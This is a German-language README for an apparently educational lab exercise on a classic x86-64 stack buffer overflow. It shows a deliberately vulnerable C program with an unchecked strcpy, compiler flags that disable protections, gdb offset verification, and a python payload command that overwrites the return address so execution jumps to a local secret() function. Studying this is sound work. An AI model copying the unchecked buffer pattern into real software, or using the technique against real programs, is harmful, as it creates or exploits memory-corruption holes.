# 01 – Stack Overflow Basics

Ein klassischer Stack Buffer Overflow auf x86-64 Linux, bewusst ohne moderne
Schutzmechanismen kompiliert, um das Grundprinzip von Grund auf zu verstehen.

## Ziel

`vulnerable()` kopiert Nutzereingabe mit `strcpy()` in einen 64-Byte
Stack-Buffer, ohne die Länge zu prüfen. Ziel: die Return-Adresse der Funktion so
überschreiben, dass das Programm zur Funktion `secret()` springt – einer
Funktion, die im normalen Programmablauf nie aufgerufen wird.

## Das verwundbare Programm

```c
void secret() {
    printf("You shouldn't be here!\n");
    exit(0);
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);   // kein Längencheck -- die Schwachstelle
    printf("You entered: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
```

## Kompiliert mit bewusst deaktivierten Schutzmechanismen

```bash
gcc -fno-stack-protector -z execstack -no-pie -g -o vuln vuln.c
```

| Flag | Schützt normalerweise vor | Warum hier aus |
|------|---------------------------|----------------|
| `-fno-stack-protector` | Return-Adress-Overwrite wird erkannt (Stack Canary) | Grundprinzip ohne Erkennung zeigen |
| `-z execstack` | Code-Ausführung vom Stack | Standard-Setup für klassische BOF-Übungen |
| `-no-pie` | Adress-Vorhersage (ASLR) | Konstante Adressen zum Nachvollziehen nötig |
| `-g` | (kein Schutz, nur Debug-Info) | Macht `gdb`/`objdump`-Analyse möglich |

## Stack-Layout von `vulnerable()`

Der Frame ist wie folgt aufgebaut (hohe zu niedrige Adressen):

```
rbp + 8   →  Return-Adresse      (8 Byte)
rbp + 0   →  Saved RBP           (8 Byte)
rbp - 64  →  buffer[64]          (64 Byte, Start)
```

`buffer` liegt also 64 Byte unterhalb von RBP, direkt gefolgt von Saved RBP
(8 Byte) und der Return-Adresse (8 Byte) – macht **72 Byte Padding**, bevor man
die Return-Adresse erreicht.

## Vorgehen

### 1. Zieladresse mit `objdump` ermitteln

```bash
objdump -d vuln | grep -A 10 "<secret>:"
```

Ergebnis: `secret()` beginnt bei `0x401196`.

### 2. Offset zur Return-Adresse mit `gdb` verifizieren

Statt den theoretischen Offset (64 Buffer + 8 Saved RBP = 72) blind zu
übernehmen, wurde er live bestätigt:

```gdb
break vulnerable
run $(python3 -c "print('A'*100)")
next                          # nach strcpy()
print (char*)$rbp + 8 - (char*)&buffer
# $1 = 72
```

Zusätzlich im Stack-Dump (`x/30xg $rsp`) nachvollzogen: die Kette aus
`0x4141414141414141` (= `'A'`-Bytes) bricht exakt bei Offset 72 ab – der Punkt,
an dem die (jetzt überschriebene) Return-Adresse beginnt.

### 3. Payload bauen

```bash
python3 -c "import struct, sys; sys.stdout.buffer.write(b'A'*72 + struct.pack('<Q', 0x401196))" > payload.bin
```

- `b'A'*72` – Padding (64 Byte Buffer + 8 Byte Saved RBP)
- `struct.pack('<Q', 0x401196)` – die Zieladresse als 8-Byte-Wert in
  Little-Endian-Reihenfolge (x86-64-Standard)

### 4. Exploit ausführen

```bash
gdb ./vuln
(gdb) run "$(cat payload.bin)"
```

Ergebnis: Statt zu `main()` zurückzukehren, springt das Programm zu `secret()` –
der Kontrollfluss wurde erfolgreich über den Stack gekapert.

```
Breakpoint 1, vulnerable (...) at vuln.c:11
...
secret () at vuln.c:4
4    void secret() {
```

## Tools

- **gcc** – Kompilieren mit gezielt deaktivierten Schutzmechanismen
- **objdump** – statische Analyse, Funktionsadressen finden
- **gdb** – dynamische Analyse, Stack-Inhalt zur Laufzeit verifizieren
- **python3 / struct** – binären Payload mit korrekter Byte-Reihenfolge bauen

## Nächste Schritte

Siehe `02-canary-bypass/` – dasselbe Grundprinzip, diesmal gegen einen
aktivierten Stack Canary, inklusive Info-Leak über einen Format-String-Bug.
